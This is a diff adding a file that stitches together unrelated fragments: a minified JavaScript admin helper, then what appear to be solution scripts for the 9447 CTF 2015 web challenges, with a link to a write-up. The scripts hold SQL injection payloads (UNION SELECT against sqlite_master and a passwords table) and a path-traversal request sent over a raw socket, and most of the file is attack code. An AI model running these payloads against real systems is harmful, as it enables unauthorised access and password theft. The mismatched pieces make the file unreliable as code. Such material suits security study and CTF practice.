@@ -1,0 +1,31 @@
+function whitelist_ip(i,t){$.post("admin/actions/new_ip_whitelist",{action:"new",user_id:i,ip:t})}function prettyPrintTime(i){i=Math.floor(i);var t=Math.floor(i/60),n=Math.floor(t/60),o=Math.floor(n/24),e=pluralise(o,"day"),a=pluralise(n%24,"hour"),l=pluralise(t%60,"minute"),u=pluralise(i%60,"second"),s=[];return e&&s.push(e),a&&s.push(a),l&&s.push(l),u&&s.push(u),s.join(", ")+" remaining"} 
+'score=5&ineq=</**/UNION/**/SELECT/**/name,null,null,null/**/FROM/**/sqlite_master;--'
+
+import socket
+ 
+sc = socket.create_connection(("yws-fsiqc922.9447.plumbing", 80))
+ 
+sc.send("GET /.. HTTP/1.1\r\n\r\n")
+ 
+while True:
+    data = sc.recv(16384)
+    if len(data) == 0:
+        break
+       
+    for line in data.split("\n"):
+        print repr(line)
+        
+import requests, json
+ 
+res = requests.post("http://premonition-p8l05mpz.9447.plumbing:9447/date_birth", data={"date_birth": "1", "ineq":"= ?/**/union/**/select/**/userid,password,1,1/**/from/**/s3ekr17_passwords --"})
+print res.content
+x = json.loads(res.content)
+ 
+s = ""
+for a,b,c,d in x:
+    s += b
+   
+print s
+
+
+https://0x90r00t.com/2015/11/30/9447-ctf-2015-web-200-nicklesndimes/
